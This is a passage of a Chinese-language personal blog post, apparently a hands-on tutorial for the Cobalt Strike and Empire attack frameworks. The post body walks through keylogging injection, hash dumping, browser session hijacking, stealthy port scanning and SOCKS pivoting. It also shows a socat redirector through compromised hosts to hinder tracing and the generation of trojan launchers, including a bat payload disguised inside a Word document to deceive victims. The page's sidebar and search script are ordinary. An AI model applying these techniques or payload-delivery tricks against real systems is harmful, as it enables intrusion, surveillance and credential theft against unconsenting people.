+<p>确定，确定，大功告成</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqns1wkjmrj303702vjr5.jpg" alt=""></p>
+<p>win10的话就不存在了，直接右键</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqns2gmjgrj30c30j20tb.jpg" alt=""></p>
+<h3 id="usb自运行payload"><a href="#usb自运行payload" class="headerlink" title="usb自运行payload"></a>usb自运行payload</h3><p>这个跟badusb原理类似，模块在<code>attacks</code>中<code>packsges</code>的<code>use/cd autoplay</code>下</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqnsdpvn73j30b906omx2.jpg" alt=""></p>
+<p>这个比较鸡肋，只对xp以下的系统管用</p>
+<h3 id="beacon-shell命令"><a href="#beacon-shell命令" class="headerlink" title="beacon shell命令"></a>beacon shell命令</h3><p>输入<code>help</code>命令可以看到所有命令集合</p>
+<p>输入<code>help 命令</code>可以看到该命令的用法</p>
+<p>例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help hashdump</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqo0f5mxhbj30bv02lgld.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqo0fvy92xj30ke052q2t.jpg" alt=""></p>
+<h3 id="搜集目标机器上的各类信息"><a href="#搜集目标机器上的各类信息" class="headerlink" title="搜集目标机器上的各类信息"></a>搜集目标机器上的各类信息</h3><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>这个模块直接右键目标机器，选择<code>explore</code>=&gt;<code>process list</code>列出进程列表</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqo0w55zmkj31an0ktmxq.jpg" alt=""></p>
+<p>然后可以直接选中一个进程，点击下面的<code>log keystokes</code>注入键盘记录</p>
+<p>此时就能记录到目标机器上的键盘记录了</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqo0xqi85ej30tt0dwmx4.jpg" alt=""></p>
+<h4 id="截屏"><a href="#截屏" class="headerlink" title="截屏"></a>截屏</h4><p>直接点击<code>screenshot</code>即可完成截屏</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqo18lif9xj31ao0ks3zd.jpg" alt=""></p>
+<h4 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h4><p>选择一个浏览器进程</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqo1iy806xj30iw06odfq.jpg" alt=""></p>
+<p>此时如果代理成功会返回代理服务器地址和端口号</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqo1jun9sfj30cv06vq2r.jpg" alt=""></p>
+<p>在本地浏览器设置代理，然后在目标机器上登录我的百度账号，刷新一下本地浏览器，发现已经登录上了我的百度云账号，实现了代理</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqo1laly68j30m60etglo.jpg" alt=""></p>
+<h3 id="通过powershell渗透框架来拓展攻击"><a href="#通过powershell渗透框架来拓展攻击" class="headerlink" title="通过powershell渗透框架来拓展攻击"></a>通过powershell渗透框架来拓展攻击</h3><p>先挖个坑，等学了powershell再来填坑</p>
+<h3 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>目前只支持arp、icmp、tcp扫描协议，线程一般开到10就行，太高容易被发现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portscan 192.168.120.0/24 1-5000 arp 10</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqo29acqaxj30q607pa9y.jpg" alt=""></p>
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rportfwd 3389 192.168.120.128 2333</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqo4b687wyj30es032jr6.jpg" alt=""></p>
+<p>但是不知道为啥不能转发3389</p>
+<h4 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h4><p>直接在beacon上右键选择<code>privoting</code>的<code>socks server</code></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fqo6i9cotaj305204kq2p.jpg" alt=""></p>
+<p>以8888端口为例子</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fqo6lmjuyfj307902wq2p.jpg" alt=""></p>
+<p>然后进入<code>view</code>的<code>proxy pivots</code></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fqo6nva1v7j31am0etgn9.jpg" alt=""></p>
+<p>选中刚刚的代理，点击tunnel，会有一个弹窗</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fqo6ou03d3j30aj04o0sj.jpg" alt=""></p>
+<p>将框里的命令粘贴到msf，就能实现代理转发到msf</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqo6pofxtjj30co023a9w.jpg" alt=""></p>
+<h4 id="反向转发通道的建立"><a href="#反向转发通道的建立" class="headerlink" title="反向转发通道的建立"></a>反向转发通道的建立</h4><p>proxychains可以允许强制使没有设置代理接口的应用使用代理</p>
+<p>通过邮件选择<code>pivoting</code>的<code>socks server</code>即可设置</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqovuobxhij307a02yt8h.jpg" alt=""></p>
+<p>设置一个自定义端口，然后在攻击机里编辑proxychains配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+<p>在末尾加上刚刚修改的端口号以及目标机器的IP即可实现代理</p>
+<p>使用时在命令前加上<code>proxychains</code>即可</p>
+<h4 id="msf-cs"><a href="#msf-cs" class="headerlink" title="msf+cs"></a>msf+cs</h4><p>首先在msf建立监听</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqo7d69aa6j30k709maam.jpg" alt=""></p>
+<p>然后在cs中建立一个监听，注意host和port要和msf的监听地址和端口一致</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fqo7ed1z4qj30a306rmwy.jpg" alt=""></p>
+<p>然后选择一个已获得shell的机器右键，选择<code>spawn</code>，选择刚刚的监听</p>
+<p>此时msf就获得了一个会话</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fqoo15jeomj30k7045glp.jpg" alt=""></p>
+<h4 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h4><p>和前面的原理类似，就是多了一层或两层代理，加大了溯源的难度，实现隐藏自己</p>
+<p>首先在cs创建一个监听，回连IP用公网IP，端口80</p>
+<p>然后连接到一个Linux肉机上，利用socat（其他转发工具也可以，自带的安全点）做转发（连到windows肉鸡也是一样的，用其他的转发工具就行）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:80,reuseaddr,fork tcp:120.79.2.221:80 &amp;</span><br></pre></td></tr></table></figure>
+<p>将本地80端口的数据全部重定向到公网IP的80端口上</p>
+<p>此时回到cs创建一个payload，将payload的IP改为肉鸡IP，此时反弹的shell就通过一层跳板回到了我们的攻击机中，可以以此类推建立多层跳板</p>
+<h2 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h2><p>和cs一样，把Empire搭在公网vps上。Empre和msf类似，都是设置监听然后生成payload或者木马，然后在目标机器上运行，最后反弹shell</p>
+<h3 id="设置监听"><a href="#设置监听" class="headerlink" title="设置监听"></a>设置监听</h3><p>先查看有哪些命令，允许<code>help</code></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fqp0sapxytj30kg0dqwfq.jpg" alt=""></p>
+<p>设置监听输入<code>listeners</code>即可进入监听，当没有设置任何监听时，会返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No listeners currently active</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fqp0vzyozkj3097020t8k.jpg" alt=""></p>
+<p>输入<code>uselistener</code>来设置采用什么监听模式，可以通过双击tab来查看有哪些监听模式</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fqp2z7seobj30fu01ot8l.jpg" alt=""></p>
+<p>以http模式为例，输入<code>uselistener http</code>，查看参数命令为<code>info</code>，和msf的<code>show options</code>一样</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fqp4ntk6mbj31a90k90wa.jpg" alt=""></p>
+<p>可以看到需要的参数都有默认值，可以不用修改，也可以根据自己的需要进行修改，<code>execute</code>启动监听</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqp4ra3dr9j309x01wt8k.jpg" alt=""></p>
+<p>利用<code>back</code>命令返回上一层，然后可以利用<code>list</code>命令列出listener，删除这个监听可以用<code>kill</code>命令</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fqp4v79y3lj30oh06ogly.jpg" alt=""></p>
+<h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><p>输入<code>usestager</code>命令然后空格两次tab就能看到所有模块的木马<br><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqp55kd46oj319c02smxg.jpg" alt=""></p>
+<p>multi为通用模块，osx为mac模块，windows为Windows模块</p>
+<p>集中常见类型的木马：</p>
+<h4 id="dll"><a href="#dll" class="headerlink" title="dll"></a>dll</h4><p>输入<code>usestager windows/dll</code>命令就能选择这个dll类型的木马</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqp669s4b9j30pa0hidhh.jpg" alt=""></p>
+<p>设置监听并执行（注意这里和msf不一样，这里的参数严格区分大小写）</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fqp69rs8qcj30ev04dt8q.jpg" alt=""></p>
+<h4 id="launcher"><a href="#launcher" class="headerlink" title="launcher"></a>launcher</h4><p>输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">launcher &lt;language&gt; &lt;listener&gt;</span><br></pre></td></tr></table></figure>
+<p>来生成一段base64编码后的powershell payload</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tKfTcgy1fqp6j3tkr4j31a50fcn4v.jpg" alt=""></p>
+<p>复制这段代码到目标机上执行，或者直接将生成的vbs到目标机器上执行，就能返回一个shell</p>
+<h4 id="launcher-vbs"><a href="#launcher-vbs" class="headerlink" title="launcher_vbs"></a>launcher_vbs</h4><p>和前面的dll木马设置类似，设置好监听就可以执行了</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tKfTcgy1fqp6hlo5dnj30lg08wglv.jpg" alt=""></p>
+<p>目标会生成一个vbs脚本，目标机器上运行就能返回一个shell</p>
+<h4 id="launcher-bat"><a href="#launcher-bat" class="headerlink" title="launcher_bat"></a>launcher_bat</h4><p>和前面的vbs一样的，不过这里提供一种思路：将这个bat文件插入到word文档里</p>
+<p>打开一个word文档，选择<code>插入</code>的<code>对象</code>，如下图所示设置好</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fqp7gn519oj30g10baglj.jpg" alt=""></p>
+<p>随意选择一个图标并更改文件名字，能达到更好的欺骗效果</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fqp7ibb2doj30bz06y3y9.jpg" alt=""></p>
+<p>受害者打开word文档，并双击这个文件就能返回一个shell</p>
+<h4 id="macro"><a href="#macro" class="headerlink" title="macro"></a>macro</h4><p>和cs里的宏设置一样的</p>
+<h4 id="ducky"><a href="#ducky" class="headerlink" title="ducky"></a>ducky</h4><p>小黄鸭，也就是badusb，之前假期玩过这个</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tKfTcgy1fqp7nsm2dsj31aa0fnqam.jpg" alt=""></p>
+<p>然后烧录进badusb插入受害者机器就能返回一个shell了</p>
+<h3 id="连接代理"><a href="#连接代理" class="headerlink" title="连接代理"></a>连接代理</h3><p>在返回shell后，可以利用<code>agents</code>命令列出shell列表，已经提权成功的shell前面有一个星号</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqq8gg19m4j30kh049n09.jpg" alt=""></p>
+<p>然后利用<code>interact</code>命令连接shell</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqq8hhdqwbj30k202q0uj.jpg" alt=""></p>
+<p>要使用windows的cmd命令时，用<code>shell command</code>格式，和cs的一样</p>
+<p>同时可以利用<code>list stale</code>命令列出已经丢失的代理，然后利用<code>remove stale</code>命令删除丢失的代理</p>
+<p>msf就不多介绍了，用的比较熟练</p>
+<hr>
+<p>路还很长</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/工具/" rel="tag"><i class="fa fa-tag"></i> 工具</a>
+          
+            <a href="/tags/内网渗透/" rel="tag"><i class="fa fa-tag"></i> 内网渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/25/磨皮皮之远程连接/" rel="next" title="磨皮皮之远程连接">
+                <i class="fa fa-chevron-left"></i> 磨皮皮之远程连接
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/28/内网三基佬之男上♂加男/" rel="prev" title="内网三基佬之男上♂加男">
+                内网三基佬之男上♂加男 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Cobalt-Strike"><span class="nav-number">1.</span> <span class="nav-text">Cobalt Strike</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#监听"><span class="nav-number">1.1.</span> <span class="nav-text">监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">1.2.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#客户端攻击"><span class="nav-number">1.3.</span> <span class="nav-text">客户端攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hta-文件下载"><span class="nav-number">1.4.</span> <span class="nav-text">hta+文件下载</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#思路"><span class="nav-number">1.4.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实施"><span class="nav-number">1.4.2.</span> <span class="nav-text">实施</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode"><span class="nav-number">1.5.</span> <span class="nav-text">shellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#钓鱼"><span class="nav-number">1.6.</span> <span class="nav-text">钓鱼</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#word宏钓鱼"><span class="nav-number">1.6.1.</span> <span class="nav-text">word宏钓鱼</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#克隆网站钓鱼"><span class="nav-number">1.6.2.</span> <span class="nav-text">克隆网站钓鱼</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#钓鱼邮件钓鱼"><span class="nav-number">1.6.3.</span> <span class="nav-text">钓鱼邮件钓鱼</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#向正常的exe文件中插入payload"><span class="nav-number">1.7.</span> <span class="nav-text">向正常的exe文件中插入payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#usb自运行payload"><span class="nav-number">1.8.</span> <span class="nav-text">usb自运行payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#beacon-shell命令"><span class="nav-number">1.9.</span> <span class="nav-text">beacon shell命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#搜集目标机器上的各类信息"><span class="nav-number">1.10.</span> <span class="nav-text">搜集目标机器上的各类信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#键盘记录"><span class="nav-number">1.10.1.</span> <span class="nav-text">键盘记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#截屏"><span class="nav-number">1.10.2.</span> <span class="nav-text">截屏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#浏览器代理"><span class="nav-number">1.10.3.</span> <span class="nav-text">浏览器代理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过powershell渗透框架来拓展攻击"><span class="nav-number">1.11.</span> <span class="nav-text">通过powershell渗透框架来拓展攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内网穿透"><span class="nav-number">1.12.</span> <span class="nav-text">内网穿透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#端口扫描"><span class="nav-number">1.12.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口转发"><span class="nav-number">1.12.2.</span> <span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代理转发"><span class="nav-number">1.12.3.</span> <span class="nav-text">代理转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反向转发通道的建立"><span class="nav-number">1.12.4.</span> <span class="nav-text">反向转发通道的建立</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msf-cs"><span class="nav-number">1.12.5.</span> <span class="nav-text">msf+cs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#重定向"><span class="nav-number">1.12.6.</span> <span class="nav-text">重定向</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Empire"><span class="nav-number">2.</span> <span class="nav-text">Empire</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#设置监听"><span class="nav-number">2.1.</span> <span class="nav-text">设置监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#生成木马"><span class="nav-number">2.2.</span> <span class="nav-text">生成木马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#dll"><span class="nav-number">2.2.1.</span> <span class="nav-text">dll</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#launcher"><span class="nav-number">2.2.2.</span> <span class="nav-text">launcher</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#launcher-vbs"><span class="nav-number">2.2.3.</span> <span class="nav-text">launcher_vbs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#launcher-bat"><span class="nav-number">2.2.4.</span> <span class="nav-text">launcher_bat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#macro"><span class="nav-number">2.2.5.</span> <span class="nav-text">macro</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ducky"><span class="nav-number">2.2.6.</span> <span class="nav-text">ducky</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#连接代理"><span class="nav-number">2.3.</span> <span class="nav-text">连接代理</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
